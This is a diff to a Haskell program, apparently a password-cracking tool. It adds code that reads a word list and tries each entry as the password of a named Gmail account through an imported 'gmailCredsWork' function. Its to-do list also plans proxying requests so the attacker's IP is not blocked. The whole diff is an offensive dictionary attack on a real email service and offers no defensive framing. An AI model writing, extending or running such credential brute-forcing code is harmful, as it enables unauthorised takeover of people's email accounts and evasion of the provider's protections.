@@ -20,7 +20,7 @@
 --
 -- Other features and things to do:
 --
---   [] Build in word list
+--   [X] Build in word list
 --   [] Custom word list param
 --   [] Proxy requests so that IP doesn't get blocked
 --
@@ -28,3 +28,23 @@
 --
 ---------------------------------------------------------------------
 
+import Crackers.Gmail
+
+data Crack = Cracked String | NotCracked deriving (Show)
+
+printShow s = putStrLn $ show s
+
+findPassword :: (String -> IO (String, Bool)) -> [String] -> IO Crack
+findPassword f [] = do return (NotCracked)
+findPassword f (p:ps) = do
+    (password, works) <- f p
+
+    if works then return (Cracked password) else findPassword f ps
+
+main :: IO ()
+main = do
+    passwords <- readFile "data/wordlist.txt"
+
+    result <- (findPassword (gmailCredsWork "hacksmomo@gmail.com") (lines passwords))
+
+    printShow (result)
